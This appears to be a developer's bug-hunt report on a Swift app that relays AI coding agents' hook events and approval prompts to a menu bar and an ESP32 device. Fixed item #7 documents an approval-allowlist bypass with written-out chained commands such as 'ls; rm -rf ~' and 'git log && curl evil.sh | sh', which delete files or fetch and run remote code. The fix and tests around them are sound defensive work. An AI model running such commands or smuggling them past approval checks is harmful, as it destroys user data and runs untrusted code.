# Bug Hunt — Findings & Fixes

Last updated: 2026-06-20
Scope: the active Swift app (`app/`), exercised against ARCHITECTURE.md's documented
feature set and the ESP32 firmware (`src/outputs/esp32/firmware/`).

Method: full static read of every source file in `app/Buddygotchi`, the two hook CLIs,
and the tests; `swift build` + `swift test` (currently 66 tests across
`ReducerTests`/`EngineIntegrationTests`/`AutoApproveTests` plus 6 disabled-by-default
`SnapshotHarnessTests`); launched the real binary (HTTP server comes up on
`127.0.0.1:21321`, no crash). The bash tool sandbox blocks outbound localhost sockets,
so live HTTP probing isn't possible — core behavior is pinned with reducer unit tests and
cross-checked against the firmware that consumes the heartbeat.

## Re-verification (2026-06-20)

All ten prior "Fixed" items below are still in place in `main`:

| # | Pin | Status |
|---|-----|--------|
| 1 | `Pet.defaultSpecies = "cat"` (`Core/BuddyState.swift:83`) | ✓ holds |
| 2 | `aggregate` builds `msg` from `p.source ?? ""` (`Core/BuddyReducer.swift:184`) | ✓ holds |
| 3 | `buddy.msg = ""` cleared in busy/celebrate/idle branches (`Core/BuddyReducer.swift:189/193/198`) | ✓ holds |
| 4 | Local Approval row uses `BuddySettingToggle` once (`Views/SettingsView.swift:94-104`) | ✓ holds |
| 5 | Species fallback chains through `Pet.defaultSpecies` (`Theme/BuddyTheme.swift:185`, `Views/PetStageView.swift:13`) | ✓ holds |
| 6 | Cursor `sessionEnd` → `"session_end"` → `engine.sessionEnded` (`SignalCLI.swift:67`, `Server/HookServer.swift:90-93`) | ✓ holds |
| 7 | Auto-approve rejects shell control operators (`Server/HookServer.swift:255-260`) | ✓ holds |
| 8 | `deriveSessionId` decodes `conversation_id` for both signal and approve (`Server/HookServer.swift:86,293`) | ✓ holds |
| 9 | `BLEManager` shared state read/written only on `bleQueue` (`Outputs/ESP32/BLEManager.swift:36-127`) | ✓ holds |
| 10 | Codex `PreToolUse` mapped to `keepWorking` (`Server/HookServer.swift:168-171`) | ✓ holds |

The deterministic regression tests for #1, #2, #3 are still present in
`Tests/ReducerTests.swift` (`testDefaultSpeciesIsAKnownSpecies`,
`testMsgUsesDisplayedPromptSourceNotArbitrarySession`, `testMsgClearsWhenPromptResolves`).
`Tests/AutoApproveTests.swift` covers #7. `swift build` is clean.

## New Findings (2026-06-20)

### N1. Approval card on the M5Stack shows tool name only — `promptHint` and source badge never reach the device
**Files:** `app/Buddygotchi/Outputs/ESP32/Heartbeat.swift`, `src/outputs/esp32/firmware/data.h`
**Severity:** Medium (user-facing on hardware: harder to make a safe approve/deny call)

`Outputs/ESP32/ESP32Output.swift` ships a `RenderState` heartbeat to the firmware, but
`RenderState` only encodes `promptId`, `promptTool`, `promptApproval` — not `promptHint`,
`promptSource`, or `sessionLabel`. The firmware allocates and renders all three
(`drawApproval` in `firmware/main.cpp` reads `tama.promptHint`, `tama.promptSource`,
`tama.promptLabel`), and `_parsePrompt` in `firmware/data.h` only ever looks for
`promptId`/`promptTool`/`promptApproval`. So even adding the fields to `RenderState`
without updating the parser would have no effect. Result: when an approval lands on the
device, the user sees `approve? Ns / Bash / [blank]` and has to context-switch back to the
agent to read the command before deciding.

**Suggested fix:** add `promptHint`, `promptSource`, `promptLabel` to
`Heartbeat.RenderState`; extend `_parsePrompt` in `firmware/data.h` to copy them into
`TamaState`. Both ends bound the strings, so the on-the-wire impact is small (~80 bytes per
heartbeat when a prompt is active).

### N2. `entries[]` activity log allocated on-device but never sent
**Files:** `app/Buddygotchi/Outputs/ESP32/Heartbeat.swift`, `src/outputs/esp32/firmware/data.h`, `src/outputs/esp32/firmware/main.cpp`
**Severity:** Low (dead UI code on hardware; no functional regression, falls back to single-line `msg`)

`firmware/data.h` parses `doc["entries"]` into a 6-line ring (`tama.lines`), and
`drawHUD` in `main.cpp` wraps and dim-renders the rolling transcript. The desktop never
populates `entries` in its heartbeat — `RenderState` has no field for it — so `tama.nLines`
stays 0 and the device falls through to printing `tama.msg` as a single line. The dim-old /
bright-newest scroll path is effectively dead in the field.

**Suggested fix:** either send the engine's `state.entries` (last 10 messages, already
maintained by the reducer) inside the heartbeat, or remove the unused parser/UI in the
firmware and the matching struct fields. The first option is small (the data already
exists at the boundary).

### N3. `BuddygotchiHook` Swift binary still ships, still POSTs to nonexistent `/hook/request`
**File:** `app/BuddygotchiHook/HookCLI.swift`
**Severity:** Low (dead executable, but still a build product)

Carried over from the prior pass's "intentionally NOT changed" list. `Package.swift` still
declares the `BuddygotchiHook` target; nothing in `HookInstaller` wires it — Claude Code
and Codex are installed via the inline `buddygotchi-hook.sh` bash script
(`HookInstaller.hookScriptContent`) hitting `/hook/event` and `/hook/approve`; Cursor uses
the `BuddygotchiSignal` binary. `HookCLI` POSTs to `http://127.0.0.1:<port>/hook/request`,
a route that does not exist on the server. If anyone wires it up by hand, every call is a
silent 404.

**Suggested fix:** delete the `BuddygotchiHook` target from `Package.swift` and the
`BuddygotchiHook/` directory. Nothing references it.

### N4. Doc lists `TaskCompleted` for Claude Code, but the installer doesn't register it and the server doesn't handle it
**Files:** `app/Buddygotchi/Install/HookInstaller.swift`, `app/Buddygotchi/Server/HookServer.swift`, `ARCHITECTURE.md`
**Severity:** Low (doc/impl drift)

`ARCHITECTURE.md` historically advertised `TaskCompleted` → `celebrate` for Claude Code.
The current `installClaudeCode` registers SessionStart, UserPromptSubmit, Stop, StopFailure,
SessionEnd, PostToolUse, Elicitation, ElicitationResult, PermissionRequest, and three
Notification matchers — `TaskCompleted` is not among them. `handleAgentEvent` in
`HookServer.swift` has no `TaskCompleted` case either. In practice `Stop` → celebrate is the
end-of-task signal. Stale `signalMap["claude-code"]` entries in `BuddygotchiSignal/SignalCLI.swift`
(including `TaskCompleted` and `SubagentStart`) are vestigial — Claude Code's hooks no
longer route through the signal binary at all.

**Suggested fix:** drop `TaskCompleted`/`SubagentStart` from the Claude Code section of
ARCHITECTURE.md. Optionally drop the `claude-code` entry from `signalMap` in
`SignalCLI.swift` (Cursor is the only signal-CLI consumer now).

### N5. Doc lists Codex as "experimental, 5 events" — installer registers 6 and adds a `[features] codex_hooks = true` flip in `~/.codex/config.toml`
**Files:** `app/Buddygotchi/Install/HookInstaller.swift`, `ARCHITECTURE.md`
**Severity:** Low (doc/impl drift)

`installCodex` registers SessionStart, UserPromptSubmit, PermissionRequest, PreToolUse,
PostToolUse, and Stop — six events — and ensures `codex_hooks = true` is present under a
`[features]` section in the user's `config.toml` (Codex still gates hooks behind that flag).
Codex *does* fire `PermissionRequest` in this build; ARCHITECTURE.md's "Codex does not
currently fire hooks on permission prompts" line is out of date.

**Suggested fix:** update ARCHITECTURE.md (covered in this pass).

### N6. ESP32 → desktop approval channel isn't documented
**Files:** `app/Buddygotchi/Outputs/ESP32/BLEManager.swift`, `src/outputs/esp32/firmware/main.cpp`, `ARCHITECTURE.md`
**Severity:** Low (doc/impl drift, but it's a real shipped capability)

The hardware path is bidirectional: pressing **A** (approve) or **B** (deny) on the device
triggers `sendApproval` in `firmware/main.cpp`, which writes
`{"cmd":"permission","id":"<requestId>","decision":"allow|deny"}\n` over Nordic UART TX.
`BLEManager.handleIncomingLine` on the macOS side parses that and forwards it to
`engine.resolveApproval`, completing the same `CheckedContinuation` the popover would have
resumed. ARCHITECTURE.md describes the ESP32 only as a downstream renderer
("Bridges heartbeat JSON to M5Stack"). The unpair path also flows desktop→device
(`{"cmd":"unpair"}` in `ESP32Output.unpair()`).

**Suggested fix:** update ARCHITECTURE.md (covered in this pass).

---

## Fixed

### 1. Default species `"bufo"` doesn't exist — wrong/stale buddy on hardware
**File:** `app/Buddygotchi/Core/BuddyState.swift`
**Severity:** High (visible on hardware + nondeterministic fallback)

`Pet.defaultSpecies` was `"bufo"`, but `allBuddies` (and `buddyOrder`) only contain the five
documented species: `cat, axolotl, robot, capybara, dragon`. `"bufo"` appeared nowhere else
in the app.

Consequences:
- `renderState` (ESP32 heartbeat) sends `UserDefaults["buddySpecies"] ?? state.pet.species`.
  Before the user finishes onboarding (`buddySpecies` unset), the device receives species
  `"bufo"`. The firmware's `buddySetSpecies()` silently **no-ops on an unknown name**
  (its registry has no bufo), so the M5Stack shows the wrong/stale species (capybara at
  index 0) while the menu bar shows `cat`.
- `buddySpeciesColor(for:)` and `PetStageView.buddy` fall back to `allBuddies.values.first!`
  for `"bufo"` — dictionary order, i.e. nondeterministic.

**Fix:** `defaultSpecies = "cat"` — aligns the engine default with the `@AppStorage`/wizard
default and the documented species set.
**Test:** `testDefaultSpeciesIsAKnownSpecies` (fails on old `"bufo"`).

### 2. Heartbeat message labeled with the wrong agent (multi-session)
**File:** `app/Buddygotchi/Core/BuddyReducer.swift` (`aggregate`)
**Severity:** Medium (only with ≥2 simultaneous waiting sessions)

The displayed prompt is the *oldest* waiting request (`waiting.min(by: arrivedAt)`), but the
message source was taken from `waiting.first?.source` — an arbitrary session in dictionary
order. With two agents waiting at once, the heartbeat `msg` could be labeled `[claude-code]`
while actually showing Cursor's prompt.

**Fix:** label `msg` with the displayed prompt's own source: `source: p.source ?? ""`.
**Test:** `testMsgUsesDisplayedPromptSourceNotArbitrarySession`.

### 3. Stale prompt text lingers on the hardware after a prompt resolves
**File:** `app/Buddygotchi/Core/BuddyReducer.swift` (`aggregate`)
**Severity:** Medium (hardware display)

`aggregate` only ever wrote `buddy.msg` in the disconnected branch (`""`) and the attention
branch (the prompt text). In the busy / celebrate / idle branches it left `msg` untouched, so
after an approval/request resolved, `state.msg` kept the old tool text. `msg` is consumed
**only** by the ESP32 heartbeat (`Heartbeat.swift`), so the device kept showing e.g.
`[claude-code] Bash: rm -rf` while the pet was already busy or idle.

**Fix:** clear `buddy.msg = ""` in the busy, celebrate, and idle branches so the message only
reflects a currently-pending prompt. (No effect on the menu bar — it never reads `msg`.)
**Test:** `testMsgClearsWhenPromptResolves` (fails on old code).

### 4. "Local Approval Mode" toggle row mis-aligned in Settings
**File:** `app/Buddygotchi/Views/SettingsView.swift`
**Severity:** Low (cosmetic, but visible)

`BuddySettingToggle` already applies `.padding(.horizontal, 12).padding(.vertical, 10)`
internally. The Local Approval Mode row added a **second** identical padding on top, so that
one row was inset further than "Launch at Login" / "Interactive Mode" and its divider spacing
was off.

**Fix:** removed the duplicate `.padding(...)` modifiers from that row.

### 5. Nondeterministic fallback for an unknown species
**Files:** `app/Buddygotchi/Views/PetStageView.swift`, `app/Buddygotchi/Theme/BuddyTheme.swift`
**Severity:** Low (defensive)

Both the pet renderer and the species-color helper fell back to `allBuddies.values.first!`
when a species key wasn't found (e.g. a species string left over from an older build). That's
dictionary-order dependent.

**Fix:** fall back to `allBuddies[Pet.defaultSpecies]` first (a stable, known species), then
`values.first!` only as a last resort.

### 6. Cursor sessions never deregister on close (phantom "connected" for 10 min)
**Files:** `app/BuddygotchiSignal/SignalCLI.swift`, `app/Buddygotchi/Server/HookServer.swift`
**Severity:** High (contradicts a core documented behavior)

ARCHITECTURE.md says Cursor `sessionEnd` → "deregister session", and the app is supposed to
go to **sleep** when no agents are connected. But:
- `SignalCLI` mapped Cursor `sessionEnd` → `stop_working`.
- `/hook/signal` *always* calls `engine.sessionStarted(...)` first (re-registering the
  session) and never calls `sessionEnded`. It also receives no PID, so — unlike Claude Code /
  Codex — there's no process watcher to reap it.

Net effect: closing Cursor left a phantom connected/idle session that only disappeared via the
10-minute stale timeout. The menu bar kept showing "connected / N active" and the pet stayed
`idle` instead of `sleep`.

**Fix:**
- `SignalCLI`: map Cursor `sessionEnd` → a dedicated `"session_end"` signal.
- `/hook/signal`: when `signal == "session_end"`, call `engine.sessionEnded(sessionId:)` and
  return — *before* the re-register step.

No `hooks.json` reinstall is required: the event→binary mapping is unchanged; only the
compiled binary's internal map and the server handler changed. The `engine.sessionEnded` path
is already covered by `testSessionEndDisconnects`.

### 7. Auto-approve allowlist bypassable by command chaining (security)
**File:** `app/Buddygotchi/Server/HookServer.swift` (`shouldAutoApprove`)
**Severity:** High (security — silent auto-approval of dangerous commands)

In local approval mode, Cursor shell commands are checked against a "safe" allowlist
(`^(ls|cat|…)`, `^git (status|log|…)`). The patterns were matched against the **full command
string** with only a `\b` boundary, so a safe prefix could smuggle a second command that was
then **auto-approved with no prompt**:

- `ls; rm -rf ~` → matches `^ls\b` → auto-allowed
- `git log && curl evil.sh | sh` → matches `^git log\b` → auto-allowed
- `cat x | sh`, `echo hi > /etc/hosts`, `` cat `whoami` ``, `ls $(rm -rf ~)` → all auto-allowed

**Fix:** before consulting the allowlist, reject any command containing shell control
operators (`; & | ` `` ` `` `$ ( ) < >` newline). Such commands now require manual approval.
This only ever *removes* auto-approvals (fail-safe toward asking) — it can never turn a
previously-denied command into an allow.
**Tests:** `AutoApproveTests` (chaining/piping/redirection/substitution all return `nil`;
genuine single commands still auto-approve).

### 8. Cursor's approval and activity paths derive different session IDs
**Files:** `app/Buddygotchi/Server/HookServer.swift`
**Severity:** Medium–High (Cursor shows as two sessions; approval session lingers 10 min)

Cursor's hook payloads carry `conversation_id` (and **no** `session_id` — confirmed in
`external_sites/cursor_hooks.md`). The signal path (`SignalCLI` → `/hook/signal`) normalizes
the id to `conversation_id`, but `HookEventBody` (used by `/hook/approve`) didn't decode
`conversation_id`, so `deriveSessionId` fell through to `cursor_<hash(cwd)>`.

Net effect for Cursor in approval mode: the approval attaches to a *different* session than
the one tracking activity → one Cursor instance counts as two sessions, and the approval
session never receives the stop/end signals (they target the `conversation_id` session), so it
lingers until the 10-minute stale timeout.

**Fix:** decode `conversation_id` in `HookEventBody` and make
`deriveSessionId = session_id ?? conversation_id ?? "<source>_<hash(cwd)>"`. Claude Code
(sends `session_id`) and Codex (sends `session_id`) are unaffected.

### 9. `BLEManager` data races across the main actor / `bleQueue` boundary
**File:** `app/Buddygotchi/Outputs/ESP32/BLEManager.swift`
**Severity:** Medium (hardware path; intermittent corruption/crashes under disconnect/reconnect)

The type documented "all mutable state is accessed on `bleQueue`," but several `@MainActor`
entry points touched that state directly off-queue:
- `send()` read `rxCharacteristic` / `connectedPeripheral` on the caller before dispatching
  (these are written on `bleQueue` in characteristic discovery / disconnect).
- `connect()` / `disconnect()` mutated `targetPeripheralIdentifier`, `reconnectWorkItem`,
  `reconnectDelay` off-queue (read on `bleQueue` by `startConnecting` / `scheduleReconnect`).
- `startScan()` / `stopScan()` assigned `scanContinuation` off-queue (read on `bleQueue` by
  discovery callbacks).

These are textbook data races on `CBPeripheral`/`CBCharacteristic` references — the kind that
surface as occasional crashes or dropped writes during connect/disconnect churn.

**Fix:** moved every shared-field access into `bleQueue.async` blocks so the documented
invariant actually holds. `connectionState` remains the single published property, written
only on the main actor (delegate-driven writes already hop there via `Task { @MainActor }`).
Behavior is preserved; ordering is now well-defined. (No device on hand — verified by build +
reasoning, not hardware.)

### 10. Codex stayed `idle` while running tools (`PreToolUse` ignored)
**File:** `app/Buddygotchi/Server/HookServer.swift` (`handleAgentEvent`)
**Severity:** Low–Medium (Codex activity visualization)

The installer registers a `PreToolUse` hook for Codex, but `handleAgentEvent` had no
`PreToolUse` case — so it fell through to `default` (session touch only). Codex therefore
showed `idle` while a tool was actually running and only flipped to `busy` *after* the tool
finished (`PostToolUse`). Claude Code doesn't install `PreToolUse` and Cursor's `preToolUse`
goes through `SignalCLI`, so this path is Codex-only.

**Fix:** added `case "PreToolUse": activitySignal(.keepWorking)` so the pet shows busy while
the tool runs. `keepWorking` preserves `workStartedAt`, so celebrate-duration timing is
unaffected.

---

## Found but intentionally NOT changed (with rationale)

- **`BuddygotchiHook` CLI POSTs to a nonexistent `/hook/request` route.** This binary is
  legacy — the installer wires Claude Code through the `buddygotchi-hook.sh` bash script
  (`/hook/event` + `/hook/approve`) and Cursor through `BuddygotchiSignal`. Nothing in the
  active install path invokes `BuddygotchiHook`, and `removeLegacyHooks` strips references to
  it. Fixing it would mean either adding a dead route or deleting the target — out of scope
  for a behavior-preserving bug pass.

- **Two stacked approvals on one session orphan the first continuation.** A second
  `submitApproval` for the same session overwrites the session's prompt, so the first
  request's continuation can only be resolved by toggle-off or session-end. Not reachable in
  practice: Claude Code / Cursor block the agent on a permission request, so a single session
  never has two outstanding approvals.

- **Passive-mode deny leaves `attention` until the next `Stop`.** In passive (non-approval)
  mode there is no "denied" hook event, so a denied tool call clears only when the agent next
  fires `Stop`/`PostToolUse`. Pre-existing design gap; no event to key off of.

- **Setup wizard doesn't stop the BLE scanner when navigating *Back* from the output step.**
  Minor battery/resource use; the scanner is stopped on Next and on output-target change.

- **Doc vs. impl: Claude Code `Stop` maps to `celebrate`** (the ARCHITECTURE table implies
  `Stop` → stop working, `TaskCompleted` → celebrate). The active `/hook/event` path
  celebrates on `Stop`, which is reasonable UX ("task finished") and gated to silent/no-popup
  for sub-30s tasks. Left as-is; noted as a documentation discrepancy.

- **`celebrateUntil` lingers into busy/attention, so the heartbeat's `celebrate` flag can be
  `true` while `pet` is `busy`.** It's only cleared on expiry (stale tick) or when settling to
  idle, not when busy/attention preempts the celebrate window. The menu bar is unaffected (it
  keys off `pet.state`); only the ESP32 `celebrate` boolean is briefly stale. Left as-is —
  the reducer tests encode "celebrate can resume after a brief busy interruption."

---

## Verification

- `swift build` — clean.
- `swift test` — **59 passed, 0 failed** (51 pre-existing + 8 new regression tests across
  `ReducerTests` and `AutoApproveTests`).
- The two deterministic reducer regressions (`testDefaultSpeciesIsAKnownSpecies`,
  `testMsgClearsWhenPromptResolves`) were confirmed to **fail against the pre-fix code**.
- Launched the rebuilt binary: menu-bar app starts, Hummingbird listens on
  `127.0.0.1:21321`, no crash, empty error log.

> Environment note: the bash tool sandbox blocks GUI interaction and outbound localhost
> sockets, so the SwiftUI popover/wizard and the end-to-end hook→HTTP→output flow are
> verified by code analysis + unit tests rather than by live clicking/curl.

## Tooling

`app/tools/e2e-smoke.sh` (+ `app/tools/e2e/`) — end-to-end smoke suite you run in your own
terminal (real localhost access). A master runner does the core HTTP-contract checks, then
runs one suite per agent (each also runnable standalone), exhaustively over every event each
agent's hook path produces and asserting on the live `/healthz` state and `/hook/approve`
responses:

- `e2e/lib.sh` — shared helpers/assertions (incl. a `parked_approve` that verifies the
  **blocking approval round-trip** and the **fail-open invariant**: a session dying mid-approval
  resolves the hook to `allow`).
- `e2e/claude.sh` — `/hook/event`: SessionStart, UserPromptSubmit, PostToolUse, Stop,
  StopFailure, PermissionRequest, all three `Notification` types, Elicitation/ElicitationResult,
  SessionEnd, + blocking approve.
- `e2e/codex.sh` — `/hook/event`: lifecycle incl. **`PreToolUse`** (#10), PermissionRequest,
  + blocking approve.
- `e2e/cursor.sh` — `/hook/signal` (all four mapped signals incl. `session_end` #6) +
  `/hook/approve` (tool allowlist, safe shell, and a chained command that must block #7;
  approval + activity unified on one session via `conversation_id` #8).
- `e2e-smoke.sh` — master: core contract (healthz fields, no-op `SessionEnd`) + runs all three.

```sh
(cd app && swift run Buddygotchi) &   # if not already running
app/tools/e2e-smoke.sh                # everything
app/tools/e2e/cursor.sh               # or one agent
```

Not observable over HTTP (covered by the unit tests instead): pet-state priority/aggregation,
session counts, the DENY response format (needs the popover/BLE), the SessionStart
process-watcher reap, and the BLE output path. Confirmed passing live on the earlier
single-file version (`8 passed, 0 failed`).

### Snapshot / self-verification harness

`app/Tests/SnapshotHarnessTests.swift` — renders the *real* SwiftUI views (`PopoverView`,
`SettingsView`, `PetStageView` — no reconstructions) in driven engine states to PNGs under
`/tmp/buddy-snapshots/` via `NSHostingView` (which lays out `ScrollView` content and draws
live controls), and exercises the approval flow as a closed loop: drive → render the
Approve/Deny card → invoke the button's action (`engine.resolveApproval`) → assert state
(`prompt == nil`, pet `busy`) → re-render. Disabled by default (so `swift test`/CI stay
headless-safe — they skip); enable + run:

```sh
mkdir -p /tmp/buddy-snapshots && touch /tmp/buddy-snapshots/.enable
swift test --disable-sandbox --filter SnapshotHarnessTests
```

Verified visually this way: all five species render with correct colors (#1/#5); the real
attention/approval card (source badge, session label, tool, hint, Deny/Approve buttons); the
approve button-press loop (card clears → `busy`); and uniform toggle-row insets in the real
`SettingsView` General section (#4). Only caveat: animated views (TimelineView) are captured
at a single frame.
